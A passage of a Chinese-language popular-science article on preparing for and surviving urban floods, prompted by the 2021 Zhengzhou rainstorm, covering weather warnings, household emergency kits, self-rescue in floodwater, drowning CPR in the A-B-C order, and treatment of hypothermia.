居安思危</strong></h4>\n<p>水往低处流的道理大家都很清楚，通常<strong>城市内涝易发区域</strong>就是地势较低的地方，包括：城区低洼地区、下凹式立交桥、地铁、地下商场与车库等地下空间、危旧房与地下室以及在建工地等，也有些地势较高区会由于排水不畅导致积水形成内涝。</p>\n<ul>\n<li>平时出行时注意一下家和单位附近的地形地貌、排水能力，平时就容易积水的区域在暴雨的时候一定要避开。</li>\n<li>乘坐地面公共交通工具时留心危急逃生用得到的<strong>破窗锤的位置</strong>，在地铁站、商场、图书馆等公共设施中注意<strong>安全出口在哪儿</strong>。微博上有视频根据被救出的受困群众的经历还原了郑州地铁困人过程，其中令我印象深刻的是，在水已经淹到脖子、车厢内空气越来越少的时刻，大家试图破窗自救，但危急关头却没有人知道锤子在哪儿，最后不得不使用座椅下的灭火器艰难地砸开了窗户。如果提前留心这样的时刻可能可以少浪费一些体力。</li>\n<li>最好也了解一下所在区域附近的河流与水库，虽说水库的重要作用之一就是蓄洪泄洪，但在郑州此次百年不遇的暴雨面前，水库泄洪可能赶不上雨水蓄积的速度。7 月 18 日内蒙古呼伦贝尔市就有 2 座水库因暴雨溃坝。因此咱们最好也要稍微留心一下周围的水库和水系，在出现超强降雨时做到心里有数。</li>\n<li>网上冲浪的时候可以在<a href=\"https://www.mem.gov.cn/kp/yjzn/\" target=\"_blank\">国家应急管理部网站</a>上多学习各种应急指南。</li>\n</ul>\n<h4>02 关注预警信息</h4>\n<p>此外，我们也要关注气象预警信息，除了手机上的天气预报外，还可以在中国气象网的<a href=\"http://www.weather.com.cn/static/html/calamity_index.shtml\" target=\"_blank\">预警频道</a>看到使用地图显示的全国各类别的灾害预警。也可以在微信里搜索「气象灾害预警」进入中国政府网国务院客户端的<strong>气象灾害预警查询系统</strong>，查看各个地区的灾害预警，每项预警点进去后都有对应的详情及防御指南。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c41s6g5b34tarbb3pba0.png\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c41s6hlb34tar307kjp0.jpeg\"></figure><p>此次郑州暴雨发生前当地的气象部门就曾多次发出暴雨红色预警。一般灾害预警有蓝、黄、橙、红四类，颜色越红危害越大，暴雨预警就是根据降雨量的迅猛程度来分等级的，蓝色预警提示 12 小时内达 50 毫米以上，黄色意味着 6 小时内达 50 毫米以上，橙色意味着 3 小时内达 50 毫米以上，而红色预警提示 3 小时内降雨达 100 毫米以上。这里的毫米降水量是指单位面积上水深 1 毫米。</p>\n<p>红色预警时就应当停止集会、停课、停业，橙色预警时处于危险地带的单位也应当停课停业，做好山洪、滑坡、泥石流等灾害的防范准备。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c41s6i5b34tasob6hijg.png\"><figcaption>暴雨预警信号分四级，分别以蓝色、黄色、橙色、红色表示，每一级都有对应的防御指南。此次郑州暴雨当地气象局就曾连发 5 次红色预警。图片来源：<a href=\"http://www.weather.com.cn/static/html/about/alarm_rain.html\" target=\"_blank\">中国天气网</a></figcaption></figure><p>在收到气象灾害警报后，<strong>如无必要就不要出门</strong>，如果还是要出门上班上课的话，要做好准备，包括：事先在手机里存好<strong>当地救援组织的电话</strong>，穿长袖长裤、防雨鞋，准备好雨具和必要的工具，在包里放一些巧克力、饼干这样高热量的食物，<strong>和家人定时联络、提前商定好汇合地点</strong>，出行路线<strong>避开易内涝的区域、电力设施和危险建筑</strong>，不要总是玩手机把手机整没电了，最好带个充电宝。</p>\n<h3>备好家庭应急包</h3>\n<p>这次河南暴雨也令我十分警醒——灾害发生后，每个人都可能成为灾害影响的对象。此时如果家中储备一定的应急物资，掌握一定的应急技能，就可快速开展自救互救和逃生避险，减少各种灾害造成的损失，拯救自己，甚至可以挽救他人的性命。去年 11 月国家发改委等 14 部门发布<strong>全国家庭应急物资储备建议清单</strong>（可进入《<a href=\"http://www.beijing.gov.cn/ywdt/gzdt/202012/t20201223_2181392.html\" target=\"_blank\">北京市居民家庭应急物资储备建议清单</a>》下载附件），鼓励居民积极参与家庭应急物资的储备，并通过家庭应急物资储备带动学习掌握基本应急技能，提高自身抵御灾害风险的能力。相信当时很多人也和我一样没有注意到这则新闻，更没有把应急包准备好，那就和我一起来准备吧。原则是优先准备基础版，有条件的尽量按扩充版储备。</p>\n<h4>01 基础 + 抗洪版</h4>\n<ul><li><strong>求救工具</strong></li></ul>\n<p>郑州暴雨第一天我就下单了一个<strong>多功能应急灯</strong>，可以照明、收听广播，支持干电池、太阳能充电和手摇发电，还可以给手机充电（需自备电源线），这样在被困时可以有光、有外界信息，保持手机电量也更有助于向外界求救和缓解焦虑，店家还送了一个<strong>救生哨</strong>。多功能应急灯、手机和救生哨，可以组成求救三件套。</p>\n<ul><li><strong>逃生工具</strong></li></ul>\n<p><strong>基础版的逃生工具</strong>包括适用于火灾的呼吸面罩、灭火器和灭火毯，适用于全灾种的多功能组合工具和逃生绳。选购的时候注意选用<strong>消防认证</strong>的产品（可在<a href=\"http://www.cccf.com.cn/certSearch/\" target=\"_blank\">消防产品信息查询系统</a>查询验证），逃生绳长度也是需要注意的，6 层以下可选用 20 米， 6 层以上请根据自己所在楼层来选购适合的长度。买了之后也不是就万事大吉了，还需要学习用它来逃生的方法。</p>\n<p><strong>洪灾中的逃生工具</strong>包括防水鞋、救生衣、防割手套等，除此之外，长时间泡在水中人很容易失温，毛巾（擦干身体）、保温毯（保暖）、防风火柴（生火）则是保暖、应对低温的重要应急物品。我买的救生衣还送了一个装手机的防水袋，与上文的充电应急灯一起用来保持与外界的通讯，</p>\n<ul><li><strong>应急药品</strong></li></ul>\n<p>还有一大类即<strong>应急药品</strong>，准备的原则是：处理外伤、感染，避免传染性疾病播散。用于外部的主要包括消毒用的碘伏棉签，包扎用的创可贴和纱布绷带，防护用的口罩、手套、驱蚊剂，以及灾后物品环境消毒用的含氯消毒液等。用于口服的则包括了常用的抗生素、用于解热对症的感冒药和治拉肚子的药。（部分可以参考我一篇拖更了很久的回答：<a href=\"https://www.zhihu.com/question/21407675/answer/154012115\" target=\"_blank\">家庭药箱需常备哪些药品和工具？ - Leslie Pan的回答 - 知乎</a>）</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/30/0b840632aeafb39b0b5932f6091b5d8d.png\"><figcaption>依据《北京市居民家庭应急物资储备建议清单》汇总做了个表格：基础版+抗洪版的应急物资储备清单，1-10 为基础物资，11-17 为抗洪所需物资。</figcaption></figure><ul><li><strong>食物和饮用水</strong></li></ul>\n<p>这个建议清单里把水和食物放到了扩充版里，我倒是觉得在基础版里也得配置好。<strong>食物储备的原则是：便携、易储存、高热量</strong>，如果家中有孩子或者老人可以适当加上营养补充剂（还要在包里放上老人慢性病需要用的药）。</p>\n<p>家里可以准备一些常规主食、速食，大米、挂面、方便面、自热米饭什么的都可以，还可以应对疫情影响不得不封小区的处境。罐头食品、真空包装常温保存的肉类（例如午餐肉、牛肉干、火腿肠）也是提供蛋白质的不错选择。盐作为钠离子的主要来源也是十分必要的，其它的糖和其它调料也可以适量储备。</p>\n<p>如果是像此次卫辉一样出现溃堤后城市持续内涝、需要避难的情况，则建议在随身的包内装上<strong>能量密度更高的食品</strong>，例如压缩饼干、巧克力、坚果、糖果等。也有专注野外生存的文章推荐单兵口粮（各种自热炒饭、炒面）和专门的防灾应急生存食品（冻干食物为主），保质期可以长达 30 年，感兴趣的小伙伴可以研究一下。</p>\n<p>饮用水也是生存的关键，可以按每人每天 1L 水的量进行储备，至少准备 3 天的用量。考虑到内涝之后水源污染，可以考虑准备上一个集成式的过滤水壶或饮用水消毒剂，将不确定是不是干净的水净化成可以饮用的水——当然，最好还是烧开了再喝。</p>\n<h4>02 扩充版</h4>\n<p>应急物资储备的扩充版就更多了，清单上列了 37 项。我首先要提到的就是<strong>重要文件资料</strong>。我们总有些身份证件、财务资料及其他重要文件要么丢了不太安全（身份证件），要么丢了就没得补（毕业证、学位证等），要么特别值钱（不动产权证、保险单等），这些物品最好使用<strong>稳妥又便携的收纳物品统一放置</strong>，这样在受灾需要转移的第一时间就能够拿好带走，尽可能地降低灾难带来的损失。同时，最好准备一份<strong>家庭紧急联络单</strong>，附上家庭成员的照片、血型、既往疾病和用药情况、地址，以及家属、应急部门和紧急联络人的联系方式，这样方便受灾后的紧急联络。（尤其适合连家里人的手机号都懒得背下来的人🙈）</p>\n<p>除此之外还包括更多的求救工具、生存工具和医疗急救工具，大家可以下载👆的附件或者下图酌情准备。兴趣更浓厚的小伙伴还可以搜索一下 BOB 包（Bug Out Bag），即逃命背包，按照陷入灾难背上背包讨生活为原则配置随身物品，网上相关分享也挺多的。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/30/2de7f4d474b11e192eb0b52bbb9f41b6.png\"></figure><h3>身体、技能和保险</h3>\n<p>早前郑州公布出的 13 位地铁 5 号线遇难者均为女性，网上立刻有人说是因为女生学习游泳技能的少，男性学游泳的多啥的。在地铁进水这个场景下，游泳这项技能可能有一定帮助，但个人意见是女性身高较矮，上肢力量弱、难以长时间攀附高处，车厢水位上涨更容易威胁到女性；同时女性虽然体脂率高于男性，但体重更小，体力更差，更不耐寒，失温的风险更大，撑到救援赶到的难度更高。这也提示我们所有人，在灾难来临的时刻，身体素质决定了我们能不能活下去。我们不能指望现实会如同好莱坞电影一样总有「最后一分钟营救」，微博上报道的平民英雄确实令人感动，但每时每刻都在你身边、能够一直依靠的还是只有自己而已。</p>\n<p>因此给大家推荐一下 @乔淼 老师在防身术指南里的提到的<a href=\"https://sspai.com/post/65039\" target=\"_blank\">「弱鸡测试」</a>，了解一下自己到底有多弱。</p>\n<blockquote><p>在一分钟内做 10 个俯卧撑（女学员可以膝盖跪地），10 个徒手深蹲，10 个卷腹，休息到下一分钟开始，然后重复，总共做 10 组。这样就是俯卧撑、深蹲和卷腹各 100 个。<strong>能完成这个小测试，你在街头遭遇危险时，就具备了起码的、「活下去」的资格。</strong></p></blockquote>\n<p>不管是不是弱鸡，和我一起锻炼身体吧。尤其是女性，练了上肢和背部你才能在进水的车厢里握紧自己的一线生机（不要担心变成肌肉女，长肌肉可没那么容易）。而且就算有肌肉有何妨，看一看奥运会的田径女运动员们，力与美完美地结合，一身训练痕迹非常耀眼。</p>\n<p>游泳、潜水甚至是跑酷等技能有条件的可以学起来，我这个旱鸭子也要把游泳提上日程了。</p>\n<p>值得一提的是保险，这次暴雨淹没了很多房屋，冲走了数不清的车辆。有<a href=\"https://news.sina.com.cn/o/2021-07-23/doc-ikqcfnca8644656.shtml\" target=\"_blank\">新闻报道</a>称，截至 23 日 12 时，保险业累计接到报案 17.69 万件，估损金额 58.27 亿元，其中车险 16.75万件，估损 47.11 亿元。车倒还好，多数人的车有涉水险可以分担损失，但被淹房屋的主人们可能就没有这样的福利了。这也提醒了目前还算幸运的我们，为我们遮风避雨、看起来坚固无比的房子也会受到损害，在火灾、暴雨、台风这样的灾难面前房子可能保护不了我们，而我们也保护不了它，买了房屋家庭财产险兴许可以保护一下我们的钱包。</p>\n<h2>发生内涝时如何应对</h2>\n<h3>在家中如何应对</h3>\n<p>汛情开始后在家中如何应对：</p>\n<ul>\n<li>家住低楼层的提前准备好沙袋、挡水板挡在门口，随时留意新闻和外面的汛情。</li>\n<li>如果积水涌入则必须将家中断电、关闭燃气阀门，然后将能使用的通讯设备放入防水袋中，携带准备好的应急包向高处转移。</li>\n<li>没有救生衣、时间允许的情况下可以将家中的塑料盆、空油桶、宽木板、大块泡沫等适合漂浮的材料做成简易的救生装置。</li>\n</ul>\n<h3>被困水中如何自救</h3>\n<p>如果内涝发生时自己已经在外面了、甚至被困了怎么办？</p>\n<h4>01 正确求救</h4>\n<ul>\n<li>拨打 110、119 是第一选择，但当大面积出现灾情时，需要帮助的人很多而警力有限，此时还可以拨打手机里提前存好的其他当地救援组织的电话，在有电有网的情况下也可以选择网络求救。网络求救时注意写上具体地点、受灾群众数量（如有老弱孕童一定要说）、紧急程度和可靠的联络方式，并在获救后及时删除求救信息，避免救援队无谓的重复涉险。</li>\n<li>向周围的居民求救。此次灾情中就有外婆和孩子被困车内，家人不在身边但<strong>通过外卖平台找到了车辆附近的饭店和便利店的电话</strong>，通过他们和其他周围的热心群众合力破窗救出了车里的老人和孩子。</li>\n<li>呼喊、吹响求救哨、挥舞色彩鲜艳的衣服/物件可以起到引起救援人员注意、定位的作用。</li>\n<li>无法打电话求助的聋哑人朋友可以手机下载「手之声」「瀛诺」「滴语7655」等应用，找在线手语翻译帮助打电话。（来自手语老师<a href=\"https://www.weibo.com/1266334520/KpFXd3ZAf\" target=\"_blank\">杜银玲的视频</a>）</li>\n</ul>\n<h4>02 积极自救</h4>\n<ul>\n<li>在室外立即寻找地势高、交通相对便利的建筑进行避险，像此次郑州暴雨后立刻有非常多的图书馆、电影院、商场发声提供临时避难场所，大家有条件的情况下了解此类资讯，及时转移到安全地点避险。安全转移要按照遵循就近、就高、迅速、有序、安全的原则。</li>\n<li>在水中行走时不要脱掉鞋子蹚水，以免脚被水中尖物划伤，如果穿了橡胶防雨靴最好。尽量贴近建筑物行走，远离路灯、信号杆、落地广告牌等金属物体，防止触电，注意观察水面，避开有水流涡旋的地方，防止跌入窖井和深坑。</li>\n<li>落水后要保持冷静，切忌挣扎，减少身体耗氧和散热，以延长水下耐受时间；发生呛水时也要保持冷静，应克制咳嗽感，先在水面上闭气静卧片刻，再将头抬出水面，边咳嗽调整呼吸动作，待气管内的水分排除后，呼吸就会恢复正常，除呼救外，取仰卧位，头部向后，使鼻部可露出水面呼吸。<strong>呼气要浅，吸气要深。</strong>如果在水中发生抽筋，千万不要惊慌，应立即停止游动，让身体成仰卧姿势；用手握住抽筋腿的脚趾，用力向上拉，使抽筋腿伸直，并用另一腿踩水，另一手划水，帮助身体上浮。尽可能抓如漂浮的东西，或抱住大树。</li>\n<li>如果有准备好的脸盆，可将其正面朝上，双手抓住脸盆边缘；如果脸盆反扣在水中，一定要将盆口全部没入水中，用双手环抱住盆。</li>\n</ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/30/6d3e8bb4d61da78f98d46e043f7d55a6.jpg\"><figcaption>图片来源：<a href=\"https://weibo.com/2630570525/Kpa4rksZl\" target=\"_blank\">@青春山东的微博视频</a></figcaption></figure><ul><li>开车遇到积水过深的地方要绕行，不要强行通过，汽车有可能在低洼积水处熄火，所以尽量避免；如果不幸熄火时，不要再启动以防止发动机进水，注意观察车外积水，一旦积水进一步加深，立刻打开车门避险，因为水位上涨到车门位置门就打不开了。如果水位上涨过快没有来得及开门，则使用车内的五金工具箱（平时不要全放到后备箱），用工具敲击车窗玻璃边缘和角落，破窗逃生。</li></ul>\n<h3>溺水的救护</h3>\n<p>河南暴雨灾情中涌现出了很多平民英雄，于逸飞医生就是其中之一。他也是被困地铁的受灾者，但在获救后听到有人需要医生又立刻返回地铁负二层，判断倒下的人的情况，阻止了其他群众<strong>先控水的错误操作</strong>，给失去心跳呼吸的人实施心肺复苏，并快速教周围的人群如何复苏，尽可能地抢救更多的人。（<a href=\"http://www.xinhuanet.com/2021-07/24/c_1127690529.htm\" target=\"_blank\">新闻链接</a>）</p>\n<p>我要向这位同行致以最高的敬意。但同时我也深感急救在人群中的普及程度之低，人们在挽救溺水者时仍然先试图把水倒出来，这会耽误分秒必争的抢救时机。这也是这篇稿子最初的话题「<strong>溺水的抢救：误区和正确做法</strong>」。</p>\n<h4>01 溺水致命的原理</h4>\n<p>落水后发生溺水是很危险的，如果急救不及时，落水淹溺后一般 4-7 min 即可致死。</p>\n<p><strong>缺氧</strong>是溺水后最主要的问题，水进入呼吸道后引起<strong>肺泡塌陷</strong>和<strong>肺不张</strong>，二氧化碳排不出来潴留后引起<strong>酸中毒</strong>，淡水进入身体后低渗透压的液体在呼吸道内会迅速进入血循环。落水的瞬间面部三叉神经受刺激后还可能会引起<strong>潜水反射</strong>，反射性引起呼吸停止、心动过缓和外周血管收缩，落入冷水和儿童溺水更多见。落水后引起的<strong>体温丢失</strong>也是很要命的，水的比热是空气的 4 倍，在相同温度下，人体在水中丧失的热量是空气中的 23 倍。人在冷水中存活的时间取决于水温、机体状况、水中姿势和皮下脂肪厚度、水中遇险生存训练程度和活动强度等。一般情况下，人在 25℃的水中可耐受 72h，在 20℃的水中可耐受 16h 20min，在 10℃ 水中可耐受 2h 40min，而在 0℃的水中只有 12min。</p>\n<p>写这些看起来很难懂的病理生理表现是想告诉大家：<strong>抢救溺水的人最紧要的是给他呼吸、恢复心跳、恢复体温！</strong>肺里没什么水的！所以<strong>不要先控水🙅！不要先控水🙅！不要先控水🙅！</strong></p>\n<h4>02 溺水的急救</h4>\n<p>根据 2020 年发表的《中国淹溺性心脏停搏心肺复苏专家共识》，正确的<strong>溺水抢救</strong>做法与常规心肺复苏有所不同，<strong>顺序为 A-B-C，即开放气道（A</strong>irway<strong>）——抢救性呼吸（B</strong>reathing<strong>）——胸外按压</strong>（和人工呼吸的循环，<strong>C</strong>ompressions）。</p>\n<p><strong>成人溺水的复苏操作如下：</strong></p>\n<p><strong>a.</strong> 判断患者意识，轻拍重唤「你怎么了！」，没有反应的话将其放在平坦硬质平面上准备抢救。</p>\n<p><strong>b. </strong>在 5-10 秒内判断呼吸和脉搏，如果是非专业人员可以只判断呼吸。然后立即拨打/指定同行者拨打 120。</p>\n<ol>\n<li>判断<strong>呼吸</strong>：靠近颈部看向胸口，一个姿势既可以听患者口鼻有无气流声，也可以观察胸口有没有正常呼吸时应该有的上下起伏，连续以 1001、1002、1003、1004、1005 的形式数数，数到 1005 时发现依然没有呼吸即可认定出现呼吸停止。</li>\n<li>判断<strong>颈动脉搏动</strong>：溺水者的心跳判断最好不要使用桡动脉等外周动脉，因为受冷水浸泡、失温及潜水反射影响，外周血管会收缩，容易产生误导。具体方法是让溺水者头稍后仰，找到甲状软骨，沿甲状软骨外侧 0.5~1.0 cm 处，气管与旁边的肌肉（胸锁乳突肌）间的沟内即可触及颈动脉。</li>\n</ol>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/30/550d184d8a730ff40bd0d435edf5f737.jpg\"><figcaption>定位颈动脉搏动。来源：<a href=\"https://quizlet.com/98941970/the-carotid-pulse-flash-cards/\" target=\"_blank\">quizlet.com</a></figcaption></figure><p><strong>c.</strong> 一旦溺水者毫无反应，呼吸（和/或颈动脉搏动）消失即认定出现心跳骤停，启动心肺复苏。没有必要试图清除水分而延误心肺复苏！具体操作细节可见下图及图注。</p>\n<ol>\n<li>\n<strong>A - 开放气道：</strong>清理口鼻的泥沙水草，用仰头抬颏法开放气道。</li>\n<li>\n<strong>B - 口对口人工呼吸：</strong>立即给予<strong>抢救性呼吸</strong>， 捏鼻包口、吹气 1 秒、松开排气 1 秒，连续给予 <strong>2-5 次通气</strong>，随后进行常规的心肺复苏流程，一般按上述要点吹气 2 次。看见胸廓上抬即表示有效，忌过度通气。</li>\n<li>\n<strong>C - 胸外按压：</strong>快速按压（按压速率 100-120 次 /min）、用力按压（成人按压深度 5-6 cm）， 胸廓充分回弹，尽量减少中断，1 个循环需要做 30 次。按压时患者口鼻可能会涌出大量泡沫状物质，是正常现象，此时不要浪费时间擦抹，抓紧按压！</li>\n</ol>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/30/6419e6ec2ab5d2f35cb27597fa299ce7.png\"></figure><ul><li>溺水急救复苏的操作要点：</li></ul>\n<ol>\n<li>开放气道：仰头抬颌法，即左手掌缘放在病人前额部向下压，右手食指和中指放在病人下颌正中向右侧旁开 2 cm 的下颌骨处向上提起，使患者头仰 30 度，下颌骨和地面垂直。</li>\n<li>人工呼吸：左手掌缘放在前额，手指顺势捏住鼻孔，自己正常呼吸后用嘴将患者的嘴完全包住，向其口中吹气 1 秒钟，抬头移开同时放开鼻孔，让病人自动排气 1-2 秒，然后进行第二次。溺水需先予抢救性呼吸 2-5 次。</li>\n<li>胸外按压：在其右手边，快速解开上衣（可选），找到胸骨下半段（两个乳头连线中点就是），左手掌根放在刚刚找到的位置，右手叠在左手上方，双手紧扣，以手掌根部为着力点进行按压，身体稍微前倾，使肩、肘、腕位于同一轴线上，与患者身体平面垂直。用整个上半身的重力按压，胳膊肘不能弯，要保证按压有力，这样才能达到胸廓下移 5-6 cm 的标准，按下后需胸廓完全回复。可用连续数「01、02、03⋯⋯30」来计数，频率要足够快，达到 100-120 次/分钟。按压 30 次之后再进行 2 次人工呼吸，以此为 1 个循环。</li>\n</ol>\n<p><strong>d.</strong> 如果有体外电除颤装置（AED）请尽快获取，在使用前擦干患者胸部。AED 能够自动识别可除颤心律，在按照机器上的指示贴好电极后观察是否需要除颤，如机器提示需要，在确保无人接触患者时启动机器进行除颤。（具体操作需根据机器型号及其指示调整）</p>\n<p><strong>e.</strong> 除颤后立刻恢复胸外按压，直至 2 分钟后确定患者恢复自主循环（判断颈动脉）或有明显征象提示恢复（咳嗽、讲话、自己能动了等）。</p>\n<ul>\n<li>如溺水者呼吸停止但尚有明显颈动脉搏动时， 在清理气道后建议单独给予人工通气，不需进行胸外按压。</li>\n<li>溺水者在接受胸外按压或人工呼吸时可能出现呕吐，此时应将其头转向一侧，用手指、衣服去除呕吐物。</li>\n<li>如果是非专业人员或未经急救训练者或不愿意进行人工呼吸者，建议单纯胸外按压亦可。单纯胸外按压可建立一定程度的血流，但溺水的主要病理生理改变是缺氧，单纯按压通气效果十分有限。但至少比被动等待要好！</li>\n</ul>\n<p>更多的关于心跳骤停急救的培训途径和操作细节可以读这篇稿子：<a href=\"https://sspai.com/post/65356\" target=\"_blank\">身边有人心跳骤停了，我该怎么办</a>。请注意，通常情况下的心跳骤停与溺水时的 CPR 抢救顺序有所不同，务必区分清楚。</p>\n<h4>03 淹溺后的严重并发症</h4>\n<p>溺水后的并发症也不少，包括胃进水引起的高渗/低渗状态、毛细血管渗漏综合征、体温过低、过敏反应、癫痫发作、颈椎损伤等，咱们捡几个重要的简单讲讲。</p>\n<ul><li><strong>迟发性溺水</strong></li></ul>\n<p>郑州暴雨之后有专家提醒获救了的受灾群众，一定要注意迟发性溺水的征兆。临床上的迟发性溺水指的是溺水后初期病情不重但后期病情恶化最终导致死亡者，是溺水严重并发症引起的。</p>\n<p>溺水引起的<strong>胃进水</strong>就是并发症之一。前面我们说到溺水的人肺里的水并不多，这是因为气道里进 1-3ml 的水就足以使得身体明显缺氧了，这时低氧血症对脑部的损害或者潜水反射都可能引起呼吸心跳骤停，此时抢救的关键不在于把肺里少量的水控出来。而在溺水者挣扎的过程中，可能会有大量的水进入胃里，如果肺里没怎么进水那患者可能早期没有什么症状，但胃里大量的水被吸收入血后，可能引起机体出现低渗（淡水）或高渗（海水）状态，最终可能导致死亡。因此，在恢复呼吸心跳后将胃里的水控出来是有意义的，但显然，控水也只在呼吸心跳恢复之后才有意义——心脏都不跳了，管以后不知道会不会出现的渗透压紊乱干啥？！</p>\n<p>微博上提到的出现胸痛、咳嗽、呼吸困难症状的迟发性溺水更可能是<strong>毛细血管渗漏综合征</strong>引起的，这是由于进入肺里的水严重损伤了肺的毛细血管，血管漏得厉害了，于是水和血就漏进了肺组织里，引起<strong>肺水肿</strong>，多出现在复苏稳定后 1-6 小时，亦可达 24h。典型的表现就是咳嗽、咳出来粉红色的泡沫痰，并且由于肺水肿影响气血交换，身体出现缺氧的表现，例如呼吸困难、没力气、嗜睡、发绀（参见上一篇<a href=\"https://sspai.com/post/67800\" target=\"_blank\">体检指南三</a>）、甚至严重的意识障碍。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c41s6llb34tasob6hikg.jpeg\"><figcaption>肺水肿的示意图：右边放大的是肺泡的结构，毛细血管网（Capillary）包绕肺泡，一呼一吸之间氧气进入血管，二氧化碳进入肺泡然后被人体呼出，但肺水肿（Pulmonary Edema）时肺泡里淤积了水，影响了这个过程，导致氧气不能充分进入血液，身体就会缺氧。来源：<a href=\"https://www.infobloom.com/what-is-pulmonary-edema.htm\" target=\"_blank\">infobloom.com</a></figcaption></figure><p>这样的问题更可能发生在儿童身上，而每年夏天都会有儿童水库溺水的报道出现，令人痛心。这也是我写这篇科普的初衷，我希望更多人了解正确的溺水急救知识，能够给夏天贪玩的孩子带来多一丝丝生存的希望。</p>\n<ul><li><strong>低温综合征</strong></li></ul>\n<p>低温综合征指的是在低温环境的影响下，身体的中心体温降至 35℃ 以下，引起机体一系列病理生理改变，产生颤抖、嗜睡、思维紊乱甚至死亡的临床表现。今年 5 月的白银越野马拉松比赛上，就有 21 人不幸遇难，最可能的凶手就是恶劣天气下气温骤降引起的失温症。体温过低也是溺水的并发症，危害很大，可能造成机体高凝状态、血流缓慢、心律失常，是溺水死亡的重要原因之一。衣着不当、老年人或幼儿、极度疲乏者更容易出现体温过低。</p>\n<p>这里说的中心体温（或体核温度，core tempreture）是指机体深部重要的组织（心、肺、脑和腹腔脏器）的温度，一般相对稳定，稍低的直肠约 37.5℃，肝脏和脑产热则较高，温度约 38℃。机体的表层组织温度则为体壳温度（shell tempreture）。体壳和体核的范围并不是固定的，会随环境温度变化改变。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c41s6ltb34tarbb3pbb0.png\"><figcaption>在不同环境中机体中心体温的范围。A. 在寒冷环境中，为减少散热量，体壳血管收缩、范围扩大，保持在 37℃的区域收缩。B. 炎热环境中，体壳血管舒张增加散热量，范围缩小，体核部范围扩大。来源：Human body temperature and new approaches to constructing temperature-sensitive bacterial vaccines.</figcaption></figure><p>临床上常用的腋窝（36-37℃）、口腔（36.3-37.2℃）和直肠（36.5-37.7℃）测温都是接近中心体温的。根据中心温度下降程度及其临床表现，可分为轻度、中度和重度。</p>\n<ul>\n<li>轻度：中心体温 35-32℃，机体开始发生一系列变化，患者出现颤抖、精细运动共济失调、嗜睡和轻度思维紊乱。</li>\n<li>中度：中心体温 32-28℃，此时身体已无法颤抖，伴有瞳孔散大，血压明显下降，神志不清。</li>\n<li>重度：中心体温在 28℃ 以下，呼吸脉搏微弱，肌肉强直，可发生心室纤颤、瞳孔和皮肤反射消失；当中心温度下降到 27℃ 时，可进入濒死状态；当中心温度下降到 20℃ 时，心脏可完全停止搏动。</li>\n</ul>\n<p>寒冷时候的颤抖是身体的保护措施，通过肌肉活动产热为机体提供更多热量，这种产热是静止代谢产热的 5-6 倍，但最多只能持续几个小时，因为太消耗葡萄糖了。如果在这个阶段，获救后去除潮湿的衣物，在头部和身体采用防潮层和隔离保温措施，充分利用颤抖的产热自发复温还是十分有效的，尤其在野外或条件有限时。</p>\n<p>对于普通人来说，重要的<strong>自救和施救措施</strong>是：</p>\n<ul>\n<li>去除湿衣物，擦干身体更换干衣服，避开寒冷环境，不能直接躺在冰冷的地上。</li>\n<li>脱离湿衣物后可使用保温毯裹住身体。这个要稍微多讲两句。之前白银事故之后有急诊科主任录过视频（<a href=\"https://weibo.com/n/%E5%A5%BD%E5%A5%87%E7%9A%84%E8%8F%9C%E5%88%80?tabtype=newVideo&amp;layerid=4641154919828629\" target=\"_blank\">@好奇的菜刀的视频</a>）指导保温毯的使用，让大家包裹上面👆介绍的核心区域（头、颈、胸腹部和腹股沟），不过这个操作可能适用范围比较小（在外面还有干衣服/防风服/毯子的情况），不太适用于落水者，也不适用于新型材料做的太空毯（又称 Mylar Blanket，下图右）。这种材料两面有不一样的特性，一面可以吸收外界的热量，比如太阳，另一面防止体温散失；普通铝膜保温毯（下图左）是两面隔绝，体温不会散失但外面的温度也进不来。如果是救护落水之后的病人，也没有衣服可换时，可以拧干湿衣服后像下面动图里操作的一样从头到尾都裹好，阻止蒸发带走热量。</li>\n</ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/30/1ae658f6b295aeac204551c0e7296de4.png\"><figcaption>常见的保温毯与使用方法</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/30/e70b7b701e6e3622d0d2a5406a9580b1.gif\"></figure><p>动图原视频中救援人员一组先脱掉了落水者的衣服，另一组铺开保温毯，在上面放了垫子，甚至一个队员躺在上面焐了一会儿，然后盖上毯子，还用了其中一名救援人员的帽子对头部进行保温，最后用保温毯将落水者整个包住。动图截取自：YouTube: <a href=\"https://www.youtube.com/watch?v=HkNHTwf5qhU&amp;t=58s\" target=\"_blank\">Hypothermia Treatment Scenario - Remote Medical International</a></p>\n<ul>\n<li>如果有热水袋或发热贴（温度不能过高，最好裹一层布），在裹保温毯前可以放在腋窝、脖子、腹股沟等区域进行加温，这些地方血管丰富，加温后让温热的血液回流到核心区，加速复温。</li>\n<li>如果伤者可以吃东西，可以喂一些含糖的高热量食物（如巧克力、能量棒等）或者流质食物。</li>\n</ul>\n<p>❌ <strong>不要做以下操作：</strong></p>\n<ul>\n<li>❌ 搓四肢——只会让外周更冷的血液加速回流到心肺等核心区，冷得更快！</li>\n<li>❌ 喝热水——容易剧烈扩张血管，导致低血压，进一步降低核心体温，可能会造成复温休克！</li>\n<li>❌ 喝酒——只会扩张血管，加速热量散失！</li>\n<li>❌ 